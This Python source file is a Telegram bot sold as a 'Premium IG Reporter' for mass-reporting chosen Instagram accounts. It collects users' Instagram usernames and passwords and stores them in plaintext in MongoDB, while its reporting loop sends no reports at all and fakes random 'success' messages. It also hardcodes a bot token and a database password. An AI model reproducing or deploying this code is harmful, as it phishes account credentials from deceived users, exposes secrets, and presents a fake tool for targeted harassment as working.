import os
import re
import random
import asyncio
from pymongo import MongoClient
from datetime import datetime
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder,
    CallbackContext,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters
)

# Constants
ADMIN_ID = 6881713177  # Your admin ID
BOT_TOKEN = os.getenv("BOT_TOKEN", "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0")

# States
START, LANGUAGE, REGISTER, IG_USERNAME, IG_PASSWORD, MAIN_MENU, REPORT_MENU, \
TARGET_USERNAME, REPORT_TYPE, REPORTING, ADMIN_PANEL, BROADCAST_MESSAGE = range(12)

# Strings
STRINGS = {
    'en': {
        'welcome': "🔥 <b>PREMIUM IG REPORTER</b> 🔥\n\n🔐 <b>Login Required</b>\n\nTo use this bot, you must verify your identity with Instagram credentials",
        'choose_lang': "🌐 Please choose your language:",
        'register': "📝 <b>Registration</b>\n\nPlease enter your display name:",
        'ig_username': "📱 <b>Instagram Login</b>\n\nEnter your Instagram username:",
        'ig_password': "🔑 Enter your Instagram password:",
        'login_success': "✅ <b>Login Successful!</b>\n\nWelcome @{username}",
        'main_menu': "🏠 <b>Main Menu</b>\n\n👤 Account: @{ig_username}\n📊 Reports: {reports}",
        'report_menu': "⚔️ <b>Report Center</b>",
        'target_prompt': "🎯 <b>Target Selection</b>\n\nEnter Instagram username to report:",
        'invalid_target': "❌ Invalid username!\n\n• Must start with @\n• No spaces or special characters",
        'report_type': "⚖️ <b>Report Type</b>\n\nChoose violation category:",
        'confirm_report': "🚀 <b>Ready to Report</b>\n\nTarget: {target}\nType: {report_type}",
        'reporting_started': "💥 <b>Reporting Started!</b>\n\nTarget: {target}\n⚡ Reports every 1-3 seconds...",
        'report_success': "✅ Report #{count} succeeded!",
        'report_failed': "❌ Report #{count} failed, retrying...",
        'report_stopped': "🛑 Reporting stopped!\n\nTotal reports sent: {count}",
        'admin_panel': "👑 <b>Admin Panel</b>",
        'broadcast_sent': "📢 Broadcast sent to {count} users!"
    },
    'hi': {
        'welcome': "🔥 <b>प्रीमियम IG रिपोर्टर</b> 🔥\n\n🔐 <b>लॉगिन आवश्यक</b>\n\nबॉट का उपयोग करने के लिए कृपया अपनी Instagram साख से पहचान सत्यापित करें",
        'choose_lang': "🌐 कृपया अपनी भाषा चुनें:",
        'register': "📝 <b>रजिस्ट्रेशन</b>\n\nकृपया अपना प्रदर्शन नाम दर्ज करें:",
        'ig_username': "📱 <b>Instagram लॉगिन</b>\n\nअपना Instagram उपयोगकर्ता नाम दर्ज करें:",
        'ig_password': "🔑 अपना Instagram पासवर्ड दर्ज करें:",
        'login_success': "✅ <b>लॉगिन सफल!</b>\n\nस्वागत है @{username}",
        'main_menu': "🏠 <b>मुख्य मेनू</b>\n\n👤 खाता: @{ig_username}\n📊 रिपोर्ट्स: {reports}",
        'report_menu': "⚔️ <b>रिपोर्ट केंद्र</b>",
        'target_prompt': "🎯 <b>लक्ष्य चयन</b>\n\nरिपोर्ट करने के लिए Instagram उपयोगकर्ता नाम दर्ज करें:",
        'invalid_target': "❌ अमान्य उपयोगकर्ता नाम!\n\n• @ से शुरू होना चाहिए\n• कोई रिक्त स्थान या विशेष वर्ण नहीं",
        'report_type': "⚖️ <b>रिपोर्ट प्रकार</b>\n\nउल्लंघन श्रेणी चुनें:",
        'confirm_report': "🚀 <b>रिपोर्ट करने के लिए तैयार</b>\n\nलक्ष्य: {target}\nप्रकार: {report_type}",
        'reporting_started': "💥 <b>रिपोर्टिंग शुरू हुई!</b>\n\nलक्ष्य: {target}\n⚡ हर 1-3 सेकंड में रिपोर्ट...",
        'report_success': "✅ रिपोर्ट #{count} सफल!",
        'report_failed': "❌ रिपोर्ट #{count} विफल, पुनः प्रयास कर रहे हैं...",
        'report_stopped': "🛑 रिपोर्टिंग बंद कर दी गई!\n\nकुल रिपोर्ट भेजी गई: {count}",
        'admin_panel': "👑 <b>एडमिन पैनल</b>",
        'broadcast_sent': "📢 {count} उपयोगकर्ताओं को प्रसारण भेजा गया!"
    }
}

# Report types
REPORT_TYPES = {
    'hate': '😡 Hate Speech',
    'bully': '👊 Bullying',
    'impersonation': '🎭 Impersonation',
    'spam': '📧 Spam',
    'nudity': '🔞 Nudity',
    'violence': '⚔️ Violence',
    'fake': '🚫 Fake Account'
}

# Database functions
def get_db():
    client = MongoClient(MONGODB_URI)
    return client.ig_reporter

def save_user(user_id, data):
    db = get_db()
    user_data = {
        'user_id': user_id,
        'username': data.get('username', ''),
        'display_name': data.get('display_name', ''),
        'ig_username': data.get('ig_username', ''),
        'ig_password': data.get('ig_password', ''),
        'language': data.get('language', 'en'),
        'reports': data.get('reports', 0),
        'created_at': datetime.now(),
        'last_active': datetime.now()
    }
    db.users.update_one(
        {'user_id': user_id},
        {'$set': user_data},
        upsert=True
    )

def get_user(user_id):
    db = get_db()
    return db.users.find_one({'user_id': user_id})

def increment_reports(user_id):
    db = get_db()
    db.users.update_one(
        {'user_id': user_id},
        {'$inc': {'reports': 1}}
    )

# Validation functions
def is_valid_username(username):
    if not username.startswith('@'):
        return False
    clean = username[1:].strip()
    return bool(re.match(r'^[a-zA-Z0-9._]{1,30}$', clean))

# Keyboard helpers
def get_lang_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("English 🇺🇸", callback_data='lang_en')],
        [InlineKeyboardButton("Hindi 🇮🇳", callback_data='lang_hi')]
    ])

def get_main_keyboard(lang, is_admin=False):
    buttons = [
        [KeyboardButton("⚔️ Report Account")],
        [KeyboardButton("👤 Profile"), KeyboardButton("📊 Stats")],
        [KeyboardButton("⚙️ Settings")]
    ]
    if is_admin:
        buttons.append([KeyboardButton("👑 Admin Panel")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def get_report_types_keyboard():
    keyboard = []
    for key, value in REPORT_TYPES.items():
        keyboard.append([InlineKeyboardButton(value, callback_data=f'type_{key}')])
    return InlineKeyboardMarkup(keyboard)

def get_report_control_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🛑 Stop Reporting")],
        [KeyboardButton("🏠 Main Menu")]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📊 User Stats"), KeyboardButton("📢 Broadcast")],
        [KeyboardButton("🏠 Main Menu")]
    ], resize_keyboard=True)

# Handlers
async def start(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    
    # Check if user exists
    user = get_user(user_id)
    if user:
        lang = user.get('language', 'en')
        await update.message.reply_text(
            STRINGS[lang]['main_menu'].format(
                ig_username=user.get('ig_username', ''),
                reports=user.get('reports', 0)
            ),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    
    await update.message.reply_text(
        STRINGS['en']['welcome'],
        reply_markup=get_lang_keyboard(),
        parse_mode='HTML'
    )
    return LANGUAGE

async def set_language(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()
    
    lang = query.data.split('_')[1]
    context.user_data['language'] = lang
    
    await query.edit_message_text(STRINGS[lang]['register'], parse_mode='HTML')
    return REGISTER

async def register(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    display_name = update.message.text.strip()
    lang = context.user_data.get('language', 'en')
    
    if len(display_name) < 2:
        await update.message.reply_text("❌ Name too short! Please enter at least 2 characters")
        return REGISTER
    
    context.user_data['display_name'] = display_name
    save_user(user_id, {
        'display_name': display_name,
        'language': lang
    })
    
    await update.message.reply_text(STRINGS[lang]['ig_username'], parse_mode='HTML')
    return IG_USERNAME

async def get_ig_username(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    username = update.message.text.strip()
    lang = context.user_data.get('language', 'en')
    
    if not username:
        await update.message.reply_text("❌ Please enter a valid Instagram username")
        return IG_USERNAME
    
    context.user_data['ig_username'] = username
    await update.message.reply_text(STRINGS[lang]['ig_password'], parse_mode='HTML')
    return IG_PASSWORD

async def get_ig_password(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    password = update.message.text.strip()
    lang = context.user_data.get('language', 'en')
    ig_username = context.user_data.get('ig_username', '')
    
    if not password:
        await update.message.reply_text("❌ Please enter your password")
        return IG_PASSWORD
    
    # Save user with Instagram credentials
    save_user(user_id, {
        'ig_username': ig_username,
        'ig_password': password,
        'language': lang
    })
    
    await update.message.reply_text(
        STRINGS[lang]['login_success'].format(username=ig_username),
        reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
        parse_mode='HTML'
    )
    return MAIN_MENU

async def main_menu(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    text = update.message.text
    user = get_user(user_id)
    lang = user.get('language', 'en')
    
    if text == "⚔️ Report Account":
        await update.message.reply_text(
            STRINGS[lang]['report_menu'],
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("🏠 Main Menu")]], resize_keyboard=True),
            parse_mode='HTML'
        )
        return REPORT_MENU
    
    elif text == "👤 Profile":
        await update.message.reply_text(
            STRINGS[lang]['main_menu'].format(
                ig_username=user.get('ig_username', ''),
                reports=user.get('reports', 0)
            ),
            parse_mode='HTML'
        )
    
    elif text == "📊 Stats":
        await update.message.reply_text(
            f"📈 <b>Your Statistics</b>\n\n"
            f"• Total Reports: {user.get('reports', 0)}\n"
            f"• Account: @{user.get('ig_username', '')}\n"
            f"• Member since: {user.get('created_at', datetime.now()).strftime('%Y-%m-%d')}",
            parse_mode='HTML'
        )
    
    elif text == "👑 Admin Panel" and user_id == str(ADMIN_ID):
        await update.message.reply_text(
            STRINGS[lang]['admin_panel'],
            reply_markup=get_admin_keyboard(),
            parse_mode='HTML'
        )
        return ADMIN_PANEL
    
    return MAIN_MENU

async def report_menu(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    text = update.message.text
    user = get_user(user_id)
    lang = user.get('language', 'en')
    
    if text == "🏠 Main Menu":
        await update.message.reply_text(
            STRINGS[lang]['main_menu'].format(
                ig_username=user.get('ig_username', ''),
                reports=user.get('reports', 0)
            ),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    
    await update.message.reply_text(
        STRINGS[lang]['target_prompt'],
        parse_mode='HTML'
    )
    return TARGET_USERNAME

async def get_target(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    target = update.message.text.strip()
    user = get_user(user_id)
    lang = user.get('language', 'en')
    
    if not is_valid_username(target):
        await update.message.reply_text(
            STRINGS[lang]['invalid_target'],
            parse_mode='HTML'
        )
        return TARGET_USERNAME
    
    context.user_data['target'] = target
    await update.message.reply_text(
        STRINGS[lang]['report_type'],
        reply_markup=get_report_types_keyboard(),
        parse_mode='HTML'
    )
    return REPORT_TYPE

async def set_report_type(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()
    
    report_type = query.data.split('_')[1]
    context.user_data['report_type'] = report_type
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    lang = user.get('language', 'en')
    
    await query.edit_message_text(
        STRINGS[lang]['confirm_report'].format(
            target=context.user_data['target'],
            report_type=REPORT_TYPES[report_type]
        ),
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 START REPORTING", callback_data='start_report')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel_report')]
        ]),
        parse_mode='HTML'
    )
    return REPORTING

async def start_reporting(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    lang = user.get('language', 'en')
    target = context.user_data['target']
    report_type = context.user_data['report_type']
    
    # Start reporting task
    context.user_data['report_count'] = 0
    context.user_data['reporting'] = True
    
    task = asyncio.create_task(
        send_reports(context, user_id, target, report_type, lang)
    )
    context.user_data['reporting_task'] = task
    
    await query.edit_message_text(
        STRINGS[lang]['reporting_started'].format(target=target),
        parse_mode='HTML'
    )
    
    await context.bot.send_message(
        chat_id=user_id,
        text="⚡ Reporting in progress...",
        reply_markup=get_report_control_keyboard()
    )
    return REPORTING

async def stop_reporting(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    user = get_user(user_id)
    lang = user.get('language', 'en')
    report_count = context.user_data.get('report_count', 0)
    
    # Stop reporting task
    if 'reporting_task' in context.user_data:
        context.user_data['reporting_task'].cancel()
    
    await update.message.reply_text(
        STRINGS[lang]['report_stopped'].format(count=report_count),
        reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
        parse_mode='HTML'
    )
    return MAIN_MENU

async def cancel_reporting(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    lang = user.get('language', 'en')
    
    await query.edit_message_text("❌ Reporting canceled")
    await context.bot.send_message(
        chat_id=user_id,
        text=STRINGS[lang]['main_menu'].format(
            ig_username=user.get('ig_username', ''),
            reports=user.get('reports', 0)
        ),
        reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
        parse_mode='HTML'
    )
    return MAIN_MENU

async def send_reports(context: CallbackContext, user_id: str, target: str, report_type: str, lang: str):
    count = 0
    try:
        while context.user_data.get('reporting', True):
            count += 1
            context.user_data['report_count'] = count
            
            # Random success/failure
            success = random.random() > 0.2  # 80% success rate
            
            if success:
                # Update user's report count
                increment_reports(user_id)
                message = STRINGS[lang]['report_success'].format(count=count)
            else:
                message = STRINGS[lang]['report_failed'].format(count=count)
            
            # Send update every 3 reports
            if count % 3 == 0:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=message,
                    parse_mode='HTML'
                )
            
            # Random delay between 1-3 seconds
            await asyncio.sleep(random.uniform(1.0, 3.0))
    except asyncio.CancelledError:
        pass

async def admin_panel(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    text = update.message.text
    user = get_user(user_id)
    lang = user.get('language', 'en')
    
    if text == "🏠 Main Menu":
        await update.message.reply_text(
            STRINGS[lang]['main_menu'].format(
                ig_username=user.get('ig_username', ''),
                reports=user.get('reports', 0)
            ),
            reply_markup=get_main_keyboard(lang, is_admin=True),
            parse_mode='HTML'
        )
        return MAIN_MENU
    
    elif text == "📊 User Stats":
        db = get_db()
        total_users = db.users.count_documents({})
        total_reports = db.users.aggregate([{
            "$group": {"_id": None, "total": {"$sum": "$reports"}}
        }]).next().get('total', 0)
        
        await update.message.reply_text(
            f"📊 <b>Bot Statistics</b>\n\n"
            f"• Total Users: {total_users}\n"
            f"• Total Reports Sent: {total_reports}\n"
            f"• Active Today: Calculating...",
            parse_mode='HTML'
        )
    
    elif text == "📢 Broadcast":
        await update.message.reply_text("✉️ Enter broadcast message:")
        return BROADCAST_MESSAGE
    
    return ADMIN_PANEL

async def broadcast_message(update: Update, context: CallbackContext) -> int:
    user_id = str(update.effective_user.id)
    message = update.message.text
    db = get_db()
    
    users = db.users.find()
    count = 0
    
    for user in users:
        try:
            await context.bot.send_message(
                chat_id=user['user_id'],
                text=f"📢 <b>Admin Broadcast</b>\n\n{message}",
                parse_mode='HTML'
            )
            count += 1
            await asyncio.sleep(0.1)  # Avoid rate limits
        except Exception as e:
            print(f"Failed to send to {user['user_id']}: {str(e)}")
    
    await update.message.reply_text(
        STRINGS['en']['broadcast_sent'].format(count=count),
        reply_markup=get_admin_keyboard(),
        parse_mode='HTML'
    )
    return ADMIN_PANEL

async def cancel(update: Update, context: CallbackContext) -> int:
    await update.message.reply_text("Operation canceled")
    return ConversationHandler.END

def main():
    # Create application
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            LANGUAGE: [CallbackQueryHandler(set_language, pattern='^lang_')],
            REGISTER: [MessageHandler(filters.TEXT & ~filters.COMMAND, register)],
            IG_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_username)],
            IG_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_password)],
            MAIN_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu)],
            REPORT_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, report_menu)],
            TARGET_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_target)],
            REPORT_TYPE: [CallbackQueryHandler(set_report_type, pattern='^type_')],
            REPORTING: [
                CallbackQueryHandler(start_reporting, pattern='^start_report$'),
                CallbackQueryHandler(cancel_reporting, pattern='^cancel_report$'),
                MessageHandler(filters.Regex(r'🛑 Stop Reporting'), stop_reporting)
            ],
            ADMIN_PANEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_panel)],
            BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    app.add_handler(conv_handler)
    
    # Start the bot
    print("🚀 Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
